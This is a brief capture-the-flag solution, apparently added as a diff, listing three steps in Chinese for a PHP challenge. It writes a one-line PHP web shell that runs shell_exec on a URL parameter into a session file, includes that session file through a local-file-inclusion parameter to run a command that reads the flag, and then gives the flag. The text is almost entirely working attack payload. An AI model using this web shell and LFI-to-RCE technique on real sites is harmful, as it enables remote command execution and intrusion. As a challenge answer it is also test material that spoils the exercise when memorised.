@@ -1,0 +1,9 @@
+1.寫入session
+<?php echo shell_exec($_GET['cmd']);?>
+
+2.讀取session並寫入參數
+http://splitline.tw:8401/?module=/tmp/sess_{ID}&cmd=cd /;cat flag_aff6136bbef82137
+
+3.
+FLAG{include(LFI_to_RCE)}
+
